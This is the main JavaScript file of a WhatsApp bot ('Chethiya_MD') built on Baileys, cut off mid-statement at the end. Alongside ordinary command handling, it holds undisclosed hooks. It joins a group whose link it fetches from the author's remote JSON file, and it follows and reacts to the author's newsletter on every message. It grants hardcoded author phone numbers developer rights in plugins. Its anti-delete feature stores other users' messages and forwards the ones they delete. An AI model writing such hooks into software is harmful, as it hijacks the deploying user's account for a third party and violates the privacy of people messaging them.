const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, openai, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const P = require('pino')
const FileType = require('file-type')
const l = console.log
var config = require('./settings')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const NodeCache = require('node-cache')
const util = require('util')
const { sms,downloadMediaMessage } = require('./lib/msg')
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
var { get_set , input_set } = require('./lib/set_db')
const axios = require('axios')
const { File } = require('megajs')
const { exec } = require('child_process');
const bodyparser = require('body-parser')
const { tmpdir } = require('os')
const Crypto = require('crypto')

var prefix = config.PREFIX
var prefixRegex = config.PREFIX === "false" || config.PREFIX === "null" ? "^" : new RegExp('^[' + config.PREFIX + ']');

 function genMsgId() {
  const lt = 'Ashuuxd';
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }   
 return randomText;
}    

const path = require('path')
const msgRetryCounterCache = new NodeCache()
    //=========================dl-ZIP========================
 
const ownerNumber =  ['94702484047']
//===================SESSION============================
  const SESSION_DIR = './session';
    if (!fs.existsSync(SESSION_DIR)) {
        fs.mkdirSync(SESSION_DIR);
      }
if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
      const sessdata = config.SESSION_ID.split("Chetiya=")[1];
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/session/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    
  }
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================



async function connectToWA() {
//Run the function
//await downloadAndExtractZip();
	console.log("Connecting  ✅...");
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/session/')
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

    conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('Installing plugins 🔌... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed ✅')
            console.log('Bot connected ✅')
	    joinGroupFromJson();	
const prefix = config.PREFIX
//=================DEPLOY MSG==================
let up = 
`🥷𝗖𝗛𝗘𝗧𝗛𝗜𝗬𝗔_𝗠𝗗 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗕𝗢𝗧💀
*╭┈───────────────•*
*│ ◦*◯ *[ 𝗖𝗛𝗔𝗡𝗘𝗟 ]*
╭┈───────────╴╴╴•⟢*
*│https://whatsapp.com/channel/0029Vb5pEQGHgZWVgS0JhS2e*
*╰┈───────────╴╴╴•⟢*
*😈 : 𝐂𝐎𝐍𝐓𝐀𝐂𝐓*
*╭┈───────────╴╴╴•⟢*
*│wa.me/94702484047*
*╰┈───────────╴╴╴•⟢*

🄿🄾🅆🄴🅁🄳 🅱🆈  😈 𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯
`;

conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
        mentionedJid: [''],
        groupMentions: [],
        //forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363401610081212@newsletter',
          newsletterName: "𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯",
          serverMessageId: 999
        },
        externalAdReply: { 
          title: '𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯',
          body: '𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯',
          mediaType: 1,
          sourceUrl: "coming soon",
          thumbnailUrl: "https://files.catbox.moe/b7hkxj.jpg",
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      } 
})

}
})

//==========AUTO WHATSAPP GROUP ADD==========
async function joinGroupFromJson() {
    try {
        let joinlink2 = await fetchJson('https://raw.githubusercontent.com/ChethiyaMD/Dhdj/refs/heads/main/zip.json');
        
        if (!joinlink2 || !joinlink2.join) {
            console.error('❌ Invalid join link data!');
            return;
        }
        
        const joinlink = joinlink2.join.split('https://chat.whatsapp.com/')[1]; // Extract invite code

        if (!joinlink) {
            console.error('❌ Invalid invite link format!');
            return;
        }

        setTimeout(async () => {
            await conn.groupAcceptInvite(joinlink);
            console.log("✅ Successfully joined the group!");
        }, 10000); // 5 seconds delay

    } catch (error) {
        console.error('❌ Error:', error);
    }
}

conn.ev.on('creds.update', saveCreds)  

    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
	    var id_db = require('./lib/id_db')    
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
//----------------AUTO STATUS VIEW-------------------------------
//STATUS READ EKANMA AUTOMA STATUS TEACT WATENAWA
//EMOJI WENAS KARANNA WITHARI THIYENNA "💗" OHOMA THIYENA THANA
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '😈'}}, { statusJidList: [mek.key.participant, mnyako] })
}	      
	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            const m = sms(conn, mek)
	    var smg = m
	        const msg = sms(conn, mek);
            const type = getContentType(mek.message)
            const content = JSON.stringify(mek.message)
            const from = mek.key.remoteJid
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
            
//============AUTO CHANNEL FOLLOW=============
const metadata = await conn.newsletterMetadata("jid", "120363401610081212@newsletter")	      
if (metadata.viewer_metadata === null){
await conn.newsletterFollow("120363401610081212@newsletter")
console.log("𝗖𝗵𝗲𝘁𝘁𝗵𝗶𝘆𝗮_𝗠𝗗 CHANNEL FOLLOW ✅")
}	                               
const id = mek.key.server_id
await conn.newsletterReactMessage("120363401610081212@newsletter", id, "❗")

//==================BUTTON====================
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :(type == 'interactiveResponseMessage' ) ? mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :(type == 'templateButtonReplyMessage' )? mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  
//===============================================
conn.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return conn.sendMessage(jid, { poll: { name, values, selectableCount }}) }

	    var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)    
	    prefix = config.PREFIX
var isCmd = body.startsWith(prefix)	    
var command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
var args = body.trim().split(/ +/).slice(1)
var q = args.join(' ')

    var body2 = ''
 if(smg.quoted && smg.quoted.fromMe && await id_db.check(smg.quoted.id)  ){
if (body.startsWith(prefix))  body = body.replace( prefix , '')
			     
			     
var id_body = await id_db.get_data( smg.quoted.id , body)
	
if (id_body.cmd) {
  isCmd = true
command = id_body.cmd.startsWith(prefix)?  id_body.cmd.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
args = id_body.cmd.trim().split(/ +/).slice(1)
q = args.join(' ')		
}
}
      console.log(command)
	      
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Sin Nombre'
	    const ownbot = config.OWNER
	    const isownbot = ownbot?.includes(senderNumber)
	    const developers = '94702484047'
            const isbot = botNumber.includes(senderNumber)
	    const isdev = developers.includes(senderNumber) 	    
            let epaneda =  "94702484047,94764237375,94775254488"
            const epada = epaneda.split(",")	    
            const isDev = [ ...epada ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)
	    const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
	    const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isReact =m.message.reactionMessage ? true : false
	    const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}

if(!isOwner) {  // Fixed redundant condition
    if(config.ANTI_DELETE === "true") {
        
        if (!m.id.startsWith("BAE5")) {
            
            // Ensure the base directory exists
            const baseDir = 'message_data';
            if (!fs.existsSync(baseDir)) {
                fs.mkdirSync(baseDir);
            }
            
            function loadChatData(remoteJid, messageId) {
                const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
                try {
                    const data = fs.readFileSync(chatFilePath, 'utf8');
                    return JSON.parse(data) || [];
                } catch (error) {
                    return [];
                }
            }
            
            function saveChatData(remoteJid, messageId, chatData) {
                const chatDir = path.join(baseDir, remoteJid);
            
                if (!fs.existsSync(chatDir)) {
                    fs.mkdirSync(chatDir, { recursive: true });
                }
            
                const chatFilePath = path.join(chatDir, `${messageId}.json`);
            
                try {
                    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
                    // console.log('Chat data saved successfully.');
                } catch (error) {
                    console.error('Error saving chat data:', error);
                }
            }
                
            function handleIncomingMessage(message) {
                const remoteJid = from; // Fixed: removed comment
                const messageId = message.key.id;
            
                const chatData = loadChatData(remoteJid, messageId);
            
                chatData.push(message);
            
                saveChatData(remoteJid, messageId, chatData);
            
                // console.log('Message received and saved:', messageId);
            }
            
            const delfrom = config.DELETEMSGSENDTO !== '' ? config.DELETEMSGSENDTO + '@s.whatsapp.net' : from;
            
            function handleMessageRevocation(revocationMessage) {
                // const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
                // const messageId = revocationMessage.message.protocolMessage.key.id;
                const remoteJid = from; 
                const messageId = revocationMessage.msg.key.id;
            
                // console.log('Received revocation message with ID:', messageId);
            
                const chatData = loadChatData(remoteJid, messageId);
            
                const originalMessage = chatData[0];
            
                if (originalMessage) {
                    const deletedBy = revocationMessage.sender.split('@')[0];
                    const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
                    const sentBy = sentBynn.split('@')[0];
                    
                    if (deletedBy.includes(botNumber) || sentBy.includes(botNumber)) return;
                    
                    const xx = '```';
                    
                    if (originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== '') {
                        const messageText = originalMessage.message.conversation;
                        if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` 
                        });
                        //........................................//........................................
                    } else if (originalMessage.msg && originalMessage.msg.type === 'MESSAGE_EDIT') { // Fixed: added check for originalMessage.msg
                        conn.sendMessage(delfrom, { 
                            text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` 
                        }, {quoted: mek});
                        
                        //........................................//........................................
                    } else if (originalMessage.message && originalMessage.message.extendedTextMessage && originalMessage.msg && originalMessage.msg.text ) { // Fixed: typo in extendedTextMessage
                        const messageText = originalMessage.msg.text;
                        if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` 
                        });
                    } else if (originalMessage.message && originalMessage.message.extendedTextMessage) { // Fixed: typo in extendedTextMessage
                        const messageText = originalMessage.message.extendedTextMessage.text; // Fixed: corrected variable name
                        if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                        
                        conn.sendMessage(delfrom, { 
                            text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` 
                        });
                    } else if (originalMessage.type === 'extendedTextMessage') {
                        async function quotedMessageRetrive() {     
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            
                            if (originalMessage.message.extendedTextMessage) {
                                const messageText = originalMessage.message.extendedTextMessage.text;
                                if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                                
                                conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` 
                                });
                            } else {
                                const messageText = originalMessage.message.extendedTextMessage && originalMessage.message.extendedTextMessage.text; // Fixed: added safe check
                                if (isGroup && messageText && messageText.includes('chat.whatsapp.com')) return; // Fixed: added check if messageText exists
                                
                                conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage && originalMessage.message.extendedTextMessage.text}${xx}` 
                                });
                            }
                        }
                        
                        quotedMessageRetrive();
                    } else if (originalMessage.type === 'imageMessage') {
                        async function imageMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.imageMessage.caption) {
                                const messageText = originalMessage.message.imageMessage.caption;
                                if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                                
                                await conn.sendMessage(delfrom, { 
                                    image: fs.readFileSync("./" + type.ext), 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` 
                                });
                            } else {
                                await conn.sendMessage(delfrom, { 
                                    image: fs.readFileSync("./" + type.ext), 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` 
                                });
                            }       
                        }
                        
                        imageMessageRetrive();
                    } else if (originalMessage.type === 'videoMessage') {
                        async function videoMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            
                            const vData = originalMessage.message.videoMessage.fileLength;
                            const vTime = originalMessage.message.videoMessage.seconds;
                            const fileDataMB = config.MAX_SIZE;
                            const fileLengthBytes = vData;
                            const fileLengthMB = fileLengthBytes / (1024 * 1024);
                            const fileseconds = vTime;
                            
                            if (originalMessage.message.videoMessage.caption) {
                                if (fileLengthMB < fileDataMB && fileseconds < 30*60) {
                                    let buff = await ml.download(nameJpg);
                                    let fileType = require('file-type');
                                    let type = fileType.fromBuffer(buff);
                                    await fs.promises.writeFile("./" + type.ext, buff);
                                    
                                    const messageText = originalMessage.message.videoMessage.caption;
                                    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
                                    
                                    await conn.sendMessage(delfrom, { 
                                        video: fs.readFileSync("./" + type.ext), 
                                        caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` 
                                    });
                                }
                            } else {
                                let buff = await ml.download(nameJpg);
                                let fileType = require('file-type');
                                let type = fileType.fromBuffer(buff);
                                await fs.promises.writeFile("./" + type.ext, buff);
                                
                                const vData = originalMessage.message.videoMessage.fileLength;
                                const vTime = originalMessage.message.videoMessage.seconds;
                                const fileDataMB = config.MAX_SIZE;
                                const fileLengthBytes = vData;
                                const fileLengthMB = fileLengthBytes / (1024 * 1024);
                                const fileseconds = vTime;
                                
                                if (fileLengthMB < fileDataMB && fileseconds < 30*60) {
                                    await conn.sendMessage(delfrom, { 
                                        video: fs.readFileSync("./" + type.ext), 
                                        caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` 
                                    });
                                }
                            }       
                        }
                        
                        videoMessageRetrive();
                    } else if (originalMessage.type === 'documentMessage') {
                        async function documentMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.documentWithCaptionMessage) {
                                await conn.sendMessage(delfrom, { 
                                    document: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.documentMessage.mimetype, 
                                    fileName: originalMessage.message.documentMessage.fileName, 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`
                                });
                            } else {
                                await conn.sendMessage(delfrom, { 
                                    document: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.documentMessage.mimetype, 
                                    fileName: originalMessage.message.documentMessage.fileName, 
                                    caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`
                                });
                            }
                        }
                        
                        documentMessageRetrive();
                    } else if (originalMessage.type === 'audioMessage') {
                        async function audioMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.audioMessage) {
                                const audioq = await conn.sendMessage(delfrom, { 
                                    audio: fs.readFileSync("./" + type.ext), 
                                    mimetype: originalMessage.message.audioMessage.mimetype, 
                                    fileName: `${m.id}.mp3` 
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: audioq});
                            } else {
                                if (originalMessage.message.audioMessage.ptt === "true") {
                                    const pttt = await conn.sendMessage(delfrom, { 
                                        audio: fs.readFileSync("./" + type.ext), 
                                        mimetype: originalMessage.message.audioMessage.mimetype, 
                                        ptt: 'true',
                                        fileName: `${m.id}.mp3` 
                                    });
                                    
                                    return await conn.sendMessage(delfrom, { 
                                        text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                    }, {quoted: pttt});
                                }
                            }
                        }
                        
                        audioMessageRetrive();
                    } else if (originalMessage.type === 'stickerMessage') {
                        async function stickerMessageRetrive() {
                            var nameJpg = getRandom('');
                            const ml = sms(conn, originalMessage);
                            let buff = await ml.download(nameJpg);
                            let fileType = require('file-type');
                            let type = fileType.fromBuffer(buff);
                            await fs.promises.writeFile("./" + type.ext, buff);
                            
                            if (originalMessage.message.stickerMessage) {
                                const sdata = await conn.sendMessage(delfrom, {
                                    sticker: fs.readFileSync("./" + type.ext),
                                    package: '𝗖𝗛𝗘𝗧𝗛𝗜𝗬𝗔_𝗠𝗗'
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: sdata});
                            } else {
                                const stdata = await conn.sendMessage(delfrom, {
                                    sticker: fs.readFileSync("./" + type.ext),
                                    package: 'DEVIL-TECH-MD  🌟'
                                });
                                
                                return await conn.sendMessage(delfrom, { 
                                    text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` 
                                }, {quoted: stdata});
                            }
                        }
                        
                        stickerMessageRetrive();
                    }
                } else {
                    console.log('Original message not found for revocation.');
                }
            }
            
            if (mek.msg && mek.msg.type === 0) {
                handleMessageRevocation(mek);
            } else {
                handleIncomingMessage(mek);
            }
        }
    }
}

//==================NONBUTTON==================
function jsonConcat(o1, o2) {
 for (var key in o2) {
  o1[key] = o2[key];
 }
 return o1;
}	

var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)  
conn.replyad = async (teks) => {
  return await conn.sendMessage(from, { text: teks ,
contextInfo: { 
mentionedJid: [m.sender], 
forwardingScore: 999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363401610081212@newsletter', 
newsletterName: "➳ᴹᴿ᭄亗*Chethiya* ╰‿╯穴༺𝘅", 
serverMessageId: 999 
}}}, { quoted: quotemek || mek})
}
const NON_BUTTON = true // Implement a switch to on/off this feature...

conn.replyList = async (from , list_reply , options) => {
function convertNumberList(sections) {
    let result = "";

    sections.forEach((section, sectionIndex) => {
        result += section.title? `${section.title}\n` : ''

        section.rows.forEach((row, rowIndex) => {
            result += `${row.title} │ ${row.description}`;
            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
        });

        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
    });

    return result;
}
if (!list_reply.sections) return false
list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
var t = { ...list_reply }
delete list_reply.sections
delete list_reply.footer
delete list_reply.buttonText
delete list_reply.title
const sentMessage = await conn.sendMessage(from, list_reply , options);	
const cmdArray = [];
t.sections.forEach((section) => {
    section.rows.forEach((row) => {
        cmdArray.push({ rowId: row.rowId, title: row.title });
    });
});
for ( let i = 0; i < cmdArray.length; i++) {	
await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
}}  
          
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}

//================FOR ROV=====================
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message                             
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}

//==================OWNER REACT=================
if(senderNumber.includes("94702484047")){
if(isReact) return
m.react("🤴")
}

//==================WORK TYPE================= 
if(!isOwner && config.MODE === "private") return 
if(!isOwner && isGroup && config.MODE === "inbox") return 
if(!isOwner && !isGroup && config.MODE === "groups") return 

//=================PLUGIN MAP==================
         const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply ,config, isCreator , isDev, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config ,isCreator , isDev, botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  }
});

//============================================================================ 
//AUto Read Function By @Um4r719
conn.ev.on('messages.upsert', async (mek) => {
    try {
        mek = mek.messages[0];
        if (!mek.message) return;

        // Handle ephemeral messages
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        // Continue with your existing message processing logic here...
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe 
            ? conn.user.id.split(':')[0] + '@s.whatsapp.net' 
            : mek.key.participant || mek.key.remoteJid;

        // More code...
    } catch (err) {
        console.error('Error in message handler:', err);
    }
});
	      
//======================================================================
       if (config.ALLWAYS_OFFLINE === "true") {
        conn.sendPresenceUpdate('unavailable'); 
    }

    if (senderNumber.startsWith('212') && config.BAD_NO_BLOCK === "true") {
        console.log(`Blocking number +212${senderNumber.slice(3)}...`);

        // Action: Either block the user or remove them from a group
        if (from.endsWith('@g.us')) {
